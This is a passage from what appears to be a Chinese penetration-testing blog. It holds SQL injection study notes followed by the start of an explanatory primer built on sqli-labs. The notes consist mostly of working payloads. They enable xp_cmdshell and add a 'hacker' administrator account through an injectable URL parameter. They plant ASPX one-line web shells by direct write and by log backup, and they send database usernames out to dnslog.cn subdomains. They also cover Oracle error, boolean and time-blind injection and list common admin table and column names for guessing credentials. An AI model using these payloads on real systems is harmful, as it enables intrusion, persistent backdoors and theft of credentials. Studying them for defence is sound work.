–</p><p>开启xpcmdshell一句话。前提 1、支持堆叠 2、扩展存储过程没被删除</p><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p><p>前提：sa权限探测是否存在1433端口。然后检测是否开启CMDSHELL</p><p>用XP_CMDSHELL添加用户hacker：</p><p>exec master..xp_cmdshell “whoami”</p><p>asp?id=3;exec master.dbo.xp_cmdshell ‘net user hacker 123456 /add’</p><p>XP_CMDSHELL把用户hacker加到ADMIN组：</p><p>asp?id=3;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker /add’</p><p>学习的文档：<a href="https://www.lagou.com/lgeduarticle/38721.html">https://www.lagou.com/lgeduarticle/38721.html</a></p><p><a href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p><p><a href="https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html">https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html</a></p><p><a href="https://blog.csdn.net/weixin_34319999/article/details/92479895">https://blog.csdn.net/weixin_34319999/article/details/92479895</a></p><h2 id="拿shell方法"><a href="#拿shell方法" class="headerlink" title="拿shell方法"></a>拿shell方法</h2><p>前提：</p><p>1具备sa或者dbo权限</p><p>2web目录的绝对路径 （可以利用xp_cmdshell的方式寻找绝对路径，插个眼）</p><h3 id="1-xp-cmdshell拿shell"><a href="#1-xp-cmdshell拿shell" class="headerlink" title="(1)xp_cmdshell拿shell"></a>(1)xp_cmdshell拿shell</h3><p>1.aspx?id=1;exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language=”Jscript”%^&gt;^&lt;%eval(Request.Item[“pass”],”unsafe”);%^&gt; &gt; c:\WWW\aufeng.aspx’ ;</p><h3 id="2-差异备份拿shell"><a href="#2-差异备份拿shell" class="headerlink" title="(2)差异备份拿shell"></a>(2)差异备份拿shell</h3><p>大概思路：</p><p>假设：<a href="http://xxxxx/show.aspx?code=1">http://xxxxx/show.aspx?code=1</a></p><p>中的code参数存在注入点 并且获得数据库名字为abc 爆出了物理路径为e:\xampp\htdocs\dvwa\</p><p>(1) 修改数据库设置为恢复模式</p><p><a href="http://xxxxx/show.asp?code=1&#39;;alter">http://xxxxx/show.asp?code=1&#39;;alter</a> database abc set RECOVERY FULL –</p><p>完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。</p><p>(2) 备份当前数据库日志到文件</p><p><a href="http://xxxxx/show.aspx?code=1&#39;;backup">http://xxxxx/show.aspx?code=1&#39;;backup</a> log abc to disk=‘e:\xampp\htdocs\dvwa’ with init –</p><p>备份数据库日志到服务器上，其中路径是网页的物理路径。</p><p>(3) 建立一张表和一个字段</p><p><a href="http://xxxxx/show.aspx?code=1&#39;;create">http://xxxxx/show.aspx?code=1&#39;;create</a> table tt(a text) –</p><p>(4) 往表中插入一句话马子</p><p><a href="http://xxxxx/show.asp?code=1&#39;;insert">http://xxxxx/show.asp?code=1&#39;;insert</a> into tt(a) values(’&lt;%eval request(“abc”) %&gt;’) –</p><p>values中的内容一般转换为马子的hex值。</p><p>(5) 再次备份日志</p><p><a href="http://xxxxx/show.asp?code=1&#39;;backup">http://xxxxx/show.asp?code=1&#39;;backup</a> log ahykd_new to disk=‘e:\xampp\htdocs\dvwa\1.aspx’ –</p><p>再次备份日志，备份路径为网站服务器的物理路径</p><p>(6) 删除表</p><p><a href="http://xxxxx/show.aspx?code=1&#39;;drop">http://xxxxx/show.aspx?code=1&#39;;drop</a> table tt –</p><p>然后菜刀尝试连接<a href="http://xxxxx/1.aspx">http://xxxxx/1.aspx</a></p><p>参考文章：这里是借鉴大佬的笔记的总结</p><p><a href="https://www.yuque.com/aufeng/aufeng_good/iganif#Q5PqT">https://www.yuque.com/aufeng/aufeng_good/iganif#Q5PqT</a></p><p><a href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p><h1 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h1><p>Access数据库没有记录所有表名和列名的表，也就意味着我们需要依靠字典进行猜解表名和列</p><p>Access数据库中没有注释符号.因此 /**/ 、 — 和 # 都没法使用。</p><p>sqlmap语句：python sqlmap.py -u “<a href="http://test.com/1.asp?id=1">http://test.com/1.asp?id=1</a>“ —tables</p><h3 id="普通注入-2"><a href="#普通注入-2" class="headerlink" title="普通注入"></a>普通注入</h3><p>判断注入点</p><p>在参数后面加 单引号</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a>‘ #页面报错</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1=1 #页面正常</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1=2 #页面报错</p><p>猜字段： 1 order by 4 报错 1 order by 3 正确</p><h3 id="有回显："><a href="#有回显：" class="headerlink" title="有回显："></a>有回显：</h3><p>?id=-1 union select 1,2,3,4,5,6,7,8,9,10 from admin（此时页面有显示2、3）</p><p>查列：and exists (select 列名 from 表名) （假设存在user、password）</p><p>?id=3 and exists (select * from test)</p><p>?id=3 and exists (select * from admin)</p><p>?id=3 and exists (select name from admin) 报错，说明不存在</p><p>?id=3 and exists (select username from admin) 说明存在username</p><p>?id=3 and exists (select password from admin) 说明存在password</p><p>?id=-1 union select 1,2,3,4,5,6,7,8,9,10 找到注入位</p><p>?id=-1 union select 1,user,password,4,5,6,7,8,9,10 from admin（即可爆出账号密码）</p><h3 id="无回显："><a href="#无回显：" class="headerlink" title="无回显："></a>无回显：</h3><p>查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常</p><p>查列：and exists (select 列名 from 表名)</p><p>查内容：and (select top 1 asc(mid(user,1,1))from admin)=97</p><p>and (select top 1 asc(mid(user,2,1))from admin)=97 猜字段(username)中第一条记录内容的第二个字符</p><p>and (select top 2 asc(mid(user,1,1))from admin)=97 猜字段(username)中第二条记录内容的第一个字符</p><h3 id="偏移注入（回显数连续）"><a href="#偏移注入（回显数连续）" class="headerlink" title="偏移注入（回显数连续）"></a>偏移注入（回显数连续）</h3><p>假设已经判断存在admin表，order by下判断有35行，且回显如下回显字段连续</p><p><img src="https://image.3001.net/images/20220714/1657765814_62cf7fb6ed96ca3d6341d.png!small" alt="image"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin —返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin —返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin —返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin —返回到一个错误页面提示查询语句出错，因此admin表的列数为6</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin</p><p>因为回显如下图 28 29 30是连着的，直接在27后加表名.*</p><p><img src="https://image.3001.net/images/20220714/1657765836_62cf7fcc12b6e7da878c0.png!small" alt="image"></p><p>爆出内容<br><img src="https://image.3001.net/images/20220714/1657765847_62cf7fd738ed7ab7c3339.png!small" alt="image"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin where id = 3 添加where id =数值，可得到更多的内容</p><h3 id="偏移注入（常规操作）"><a href="#偏移注入（常规操作）" class="headerlink" title="偏移注入（常规操作）"></a>偏移注入（常规操作）</h3><p>Access偏移注入：表名知道，列名无法获取的情况下。</p><p>存在注入点，且order by下判断出字段数为22行</p><p><strong>爆出显位</strong></p><p>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p><p><strong><em>*</em></strong>号判断直到页面错误有变化**</p><p>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</p><p>说明admin有6个字段</p><p><strong>Access\</strong>*<em>偏移注入*</em>，基本公式为：</p><p>order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；</p><p>也就是：</p><p>* = 6个字符</p><p>2 × * = 12个字符</p><p>22 - 12 = 10个字符</p><p>一级偏移语句：</p><p>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)</p><p>二级偏移语句：</p><p>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)</p><p>实战常见的表和列（也可以用sqlmap的，但是量大且效率低）</p><p>常见的表有（最后根据企业名的缩写搭配上admin、user、name）</p><p>admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin product、news、usr、system、article、customer、area</p><p>admin_id、admin_name、admin_password</p><p>常见的列</p><p>admin admin_user username password passwd pass pwd users usr user_login user_name login_name name等等</p><p>oracle注入(jsp)</p><p><img src="https://image.3001.net/images/20220714/1657765866_62cf7fea9f4e6948d11dd.png!small" alt="image"></p><h2 id="常规有回显注入"><a href="#常规有回显注入" class="headerlink" title="常规有回显注入"></a>常规有回显注入</h2><p>order by 3—</p><p>and 1=2 union select null,null,null from dual—</p><p>and 1=2 union select ‘null’,null,null from dual— //返回正常，则第一个字段是数字型，返回错误，为字符型</p><p>and 1=2 union select 1,’2’,’3’ from dual— //判断显示位</p><p>and 1=2 union select null,(select banner from sys.v_$version where rownum=1),null from dual— //探测数据库版本信息</p><p>and 1=2 union select null,(select table_name from user_tables where rownum=1),null from dual— //查询第一个表名</p><p>and 1=2 union select null,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;’STUDENT’),null from dual— //第二个表名</p><p>获取关键表中的列名：</p><p>‘ union select null,(select column_name from user_tab_columns where table_name=’T_USER’ and rownum=1),null from dual —</p><p>‘ union select null,(select column_name from user_tab_columns where table_name=’T_USER’ and column_name&lt;&gt;’SUSER’ and rownum=1),null from dual —</p><p>‘ union select null,(select column_name from user_tab_columns where table_name=’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and rownum=1),null from dual —</p><p>‘ union select null,(select column_name from user_tab_columns where table_name=’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and column_name&lt;&gt;’SNAME’ and rownum=1),null from dual —</p><p>and 1=2 union select SNAME,SUSER,SPWD from T_USER where id=1— //查看数据</p><h3 id="第二种常规注入"><a href="#第二种常规注入" class="headerlink" title="第二种常规注入"></a>第二种常规注入</h3><p>确定回显位，假设当前共2个字段，全是数字型，判断方式如下：<br>and 1=2 union select 1,2 from dual　　假设回显位是2，爆当前数据库中的第一个表：<br>and 1=2 union select 1,(select table_name from user_tables where rownum=1) from dual　　爆当前数据库中的第二个表：<br>and 1=2 union select 1,(select table_name from user_tables where rownum=1 and table_name not in (‘第一个表’)) from dual　　以此类推去爆第n个表<br>爆某表中的第一个字段：<br>and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=’表名（大写的）’) from dual　　爆某表中的第二个字段：<br>and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=’表名’ and column_name not in (‘第一个字段’)) from dual　　爆其它字段以此类推<br>爆某表中的第一行数据：<br>and 1=2 union select 1,字段1||字段2…||字段n from 表名 where rownum=1 —连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串</p><h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 utl_inaddr.get_host_name<br>这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，当前数据库用户必须有网络访问权限。</p><p>jsp?name=’ and 1=utl_inaddr.get_host_name((select user from dual)) —</p><p>ctxsys.drithsx.sn()</p><p>jsp?name=’ and 1=ctxsys.drithsx.sn(1,(select user from dual)) —</p><p>dbms_xdb_version.checkin()</p><p>jsp?name=1’ and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null—</p><p>dbms_utility.sqlid_to_sqlhash()</p><p>jsp?name=1’ and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null —</p><p>XMLType()</p><p>sname=1′ and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null —</p><h3 id="布尔注入-1"><a href="#布尔注入-1" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsp?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) --</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20220714/1657765888_62cf80001865e22a5f8e0.png!small" alt="image"></p><p>username=admin’ and (select substr(user, 1, 1) from dual)=’S’ —</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>主要用DBMS_PIPE.RECEIVE_MESSAGE</p><p>即user的第一位是”A”时，延时5秒执行。</p><p>And 1=(select decode(substr(user,1,1),’A’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>第二位是D时，延时5秒</p><p>And 1=(select decode(substr(user,2,1),’D’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>news.jsp?id=1 and 1=(select decode(substr(user,1,1),’S’,dbms_pipe.receive_message(‘RDS’,5),0) from dual) –</p><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>utl_inaddr.get_host_address</p><p>select utl_inaddr.get_host_address((select user from dual)||’.cbb1ya.dnslog.cn’) from dual</p><p>SYS.DBMS_LDAP.INIT 这个函数在 10g/11g 中是 public 权限.</p><p>SELECT DBMS_LDAP.INIT((select user from dual)||’.24wypw.dnslog.cn’,80) FROM DUAL;</p><p>借鉴大佬博客：<a href="https://www.yuque.com/aufeng/aufeng_good/iganif#zoa46">https://www.yuque.com/aufeng/aufeng_good/iganif#zoa46</a></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h2 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h2><p>如果您的站点允许用户通过网页输入，并将输入内容插入到 SQLite 数据库中，这个时候您就面临着一个被称为 SQL 注入的安全问题。本章节将向您讲解如何防止这种情况的发生，确保脚本和 SQLite 语句的安全。</p><p>1.Sqlite-master:这个是内置系统表、相当于mysql的information_schema</p><p>但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型</p><p>2.sqlite并不支持像mysql那样的注释，但是可以通过 — 方式增加DDL注释(写shell会用到)</p><p>可参考：<a href="https://blog.csdn.net/hackzkaq/article/details/117119953">https://blog.csdn.net/hackzkaq/article/details/117119953</a></p><h2 id="Postsql注入"><a href="#Postsql注入" class="headerlink" title="Postsql注入"></a>Postsql注入</h2><p>PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS），4.2版本为基础的对象关系型数据库管理系统。</p><p>PostgreSQL安装后，默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p><ul><li>注释符：—</li><li>延时函数：pg_sleep(3)</li></ul><p><img src="https://image.3001.net/images/20220714/1657765907_62cf8013ada166b4cf32d.png!small" alt="image"></p><p>可参考谢公子的文章：<a href="https://blog.csdn.net/qq_36119192/article/details/104628797">https://blog.csdn.net/qq_36119192/article/details/104628797</a></p><h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h2><p>基础知识<br>Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。</p><p>Oracle的数据类型是强匹配的(MYSQL有弱匹配的味道)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。</p><p>参考文档学习：<a href="https://blog.csdn.net/weixin_42508548/article/details/121516504">https://blog.csdn.net/weixin_42508548/article/details/121516504</a></p><p>总结: 本文主要是对Owasp-top10—sql注入的学习整理，参考了一些大佬的文章，还尚有不足，需要多加学习，望大佬们多多支持。</p><p>本文作者：Nday00</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入精讲</title>
      <link href="/posts/bd44.html"/>
      <url>/posts/bd44.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><h4 id="理解SQL注入"><a href="#理解SQL注入" class="headerlink" title="理解SQL注入"></a>理解SQL注入</h4><p>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。</p><p>由于SQL语句本身的多样性，以及可用于构造SQL语句的方法很多，因此凡是构造SQL语句的步骤均存在被攻击的潜在风险。</p><p>SQL注入的方式主要是直接将代码插入参数中，这些参数会被置入SQL命令中加以执行。</p><p>间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。</p><p>当将存储的字符串置入动态SQL命令中时，恶意代码就将被执行。</p><p>如果web应用未对动态构造的SQL语句使用的参数进行正确性审查（即便使用了参数化技术）</p><p>攻击者就很可能会修改后台SQL语句的构造</p><p>如果攻击者能够修改SQL语句，那么该语句将与应用的用户具有相同的权限。</p><p>当使用SQL服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。</p><p>如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 </p><h4 id="SQL注入的产生过程及常见原因"><a href="#SQL注入的产生过程及常见原因" class="headerlink" title="SQL注入的产生过程及常见原因"></a>SQL注入的产生过程及常见原因</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.产生过程</span><br><span class="line">大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</span><br><span class="line">2.常见的sql注入产生原因</span><br><span class="line">基于此，SQL注入的产生原因通常表现在以下几方面：</span><br><span class="line">1. 转义字符处理不合适；</span><br><span class="line">2. 不安全的数据库配置；</span><br><span class="line">3. 不合理的查询集处理；</span><br><span class="line">4. 不当的错误处理；</span><br><span class="line">5. 多个提交处理不当。 </span><br><span class="line">3.不当的处理类型</span><br><span class="line">    Sql数据库将单引号字符（’）解析成代码与数据间的分界线：</span><br><span class="line">    单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。</span><br><span class="line">    因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </span><br><span class="line">4.不安全的数据库配置</span><br><span class="line">   数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</span><br><span class="line">   这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</span><br><span class="line">5.不合理的查询集处理</span><br><span class="line">    有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</span><br><span class="line">6.不当的错误处理</span><br><span class="line">    错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </span><br><span class="line">7.多个提交处理不当</span><br><span class="line">大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。</span><br><span class="line">    应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</span><br><span class="line">    例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </span><br></pre></td></tr></table></figure><h4 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h4><p>数据在数据库中是按照表单的方式存储的</p><p>在phpstudy里面</p><p>可以很方便的打开mysql终端</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461842773-c072384e-87c2-4b75-bfc6-8247ac3ea217.png" alt="img"></p><p>使用 <code>show databases;</code> 命令可以查看所有的数据库名</p><p>我的存在数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">information_schema</span><br><span class="line">challenges</span><br><span class="line">mysql</span><br><span class="line">performance_schema</span><br><span class="line">security</span><br><span class="line">test</span><br><span class="line">yichen</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461099740-907a0ae6-9bb7-4a99-9973-2fb0937a448e.png" alt="img"></p><p>其中：<strong>information_schema</strong> 数据库是 MySQL 自带的</p><p>在 MySQL 中，把 information_schema 看作是一个数据库，确切说是信息数据库</p><p>其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息</p><p>如数据库名，数据库的表，表栏的数据类型与访问权限等</p><p>数据库里面几张重要的表的状态我放在这，如果后面涉及这几张表不太明白可以回来看一下</p><p>使用<code>use yichen;</code> 用来选择想要使用的数据库</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461487799-565a79c5-5278-4aee-8057-dca7d3b59a95.png" alt="img"></p><p>使用 <code>show tables;</code> 来显示数据库中的所有数据表</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461593350-90cbee18-612b-4b6f-ac1a-e065bae4e209.png" alt="img"></p><p>使用 <code>select * from yichen;</code> 来查看数据表”yichen”中所有的数据信息</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461958036-f609eaaa-922f-4eb2-a954-48f7d4eefe39.png" alt="img"></p><p>数据表：yichen中一共有三列数据，列名分别是：id，name，age</p><p>如果想查看yichen表中writeup的年龄应该怎样那？</p><p>有两种简单的方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> yichen <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;writeup&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> yichen <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>这里需要注意的是name字段属于字符串，所以需要用单引号引起来</p><p>那其实当我们访问一个网页上的时候比如sqli-labs的第一关：</p><p>?id=1实际上就是去数据库里面查询id=1的时候的 name 和 password列的值</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573462434520-3b672c43-8219-48a4-bef9-095410f4a486.png" alt="img"></p><p>补充一些关于information_schema数据库的数据表的信息：</p><p><strong>SCHEMATA 表：</strong></p><p>提供了当前 mysql 中所有数据库的信息（主要用来查询数据库名（schema_name））</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474150129-3f2bd79e-a202-4e8e-b856-0aafde35fa82.png" alt="img"></p><p><strong>TABLES 表：</strong>提供了关于数据库中的表的信息（包括视图）</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573472943149-8b1d46ce-6403-48f5-8ac8-f213e5ffc4b5.png" alt="img"></p><p>在 phpmyadmin 里可以看的清楚点（主要用来查询数据表名 (table_name)）</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474346090-85d104c4-c093-464b-8af4-5ef3b1c300c3.png" alt="img"></p><p><strong>COLUMNS 表：</strong>提供了表中的列信息（主要用来查询字段名（column_name））</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474209881-b5b2a5cf-5a19-420b-ad6f-fbb690f1ff67.png" alt="img"></p><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>前面提到访问?id=1的时候就是去数据库里查询id=1的字段的值，</p><p>那么</p><p>当我不去正常访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1</span><br></pre></td></tr></table></figure><p>而是访问一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure><p>会发生什么？报错了！</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573463020241-ea253b3e-aecf-4e98-b0b8-0be5199c9291.png" alt="img"></p><p>看报错的回显发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">您的SQL语法有误； </span><br><span class="line">检查与您的MySQL服务器版本相对应的手册以获取正确的语法</span><br><span class="line">以在第1行的&#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27;附近使用</span><br></pre></td></tr></table></figure><p>仔细看一下，’’1’’ LIMIT 0,1’，会发现单引号是这么配对的<img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573463731758-49360687-a0f8-4af2-97c5-12069ba95d80.png" alt="img"></p><p>也就是说我们输入的 1’ 去查询的时候出问题了，我们可以查看一下less-1的源代码，找到查询语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))<span class="comment">//使用get方式接受一个参数id</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];<span class="comment">//把get得到的id的值赋给变量id</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">//使用这条语句去查询</span></span><br><span class="line"><span 